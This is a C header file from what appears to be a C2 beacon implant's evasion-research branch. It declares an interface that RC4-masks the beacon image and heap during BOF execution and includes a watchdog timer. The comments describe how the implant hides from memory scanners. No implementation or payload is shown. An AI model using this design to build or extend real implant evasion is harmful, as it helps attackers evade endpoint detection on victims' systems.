#pragma once

#include <windows.h>

/* Phase 3 BOF-window masking (evasion-research branch, section 13.11).
 *
 * Runs a Win32-only BOF (zero beacon-API imports - boff.cpp verifies via
 * the relocation stream) with the FULL beacon image and every tracked heap
 * block RC4-masked for the whole execution. Enter/exit transitions run
 * from a hand-assembled private page; a one-shot watchdog timer force-
 * restores plaintext if the BOF never returns, so the process can never
 * hang in the masked state. See sleepmask_bofwin.cpp for the byte-level
 * design. x64 only. */

#define BW_DEFAULT_WATCHDOG_MS 120000

/* TRUE when the engine pages are built and usable. Cheap; boff.cpp calls
 * this before offering a BOF the masked window. */
BOOL bofwin_supported(void);

/* CI diagnostics: the built stub page (capstone-mirror verification), or
 * NULL before the first bofwin_supported/window call. */
void * bofwin_test_stub_page(void);

/* Run entry(args, alen) inside the masked window. Returns FALSE when the
 * window cannot be served (engine unavailable, background threads active,
 * snapshot without .text, no watchdog) - the caller then runs the BOF
 * unmasked. watchdog_ms==0 selects BW_DEFAULT_WATCHDOG_MS. */
BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms);
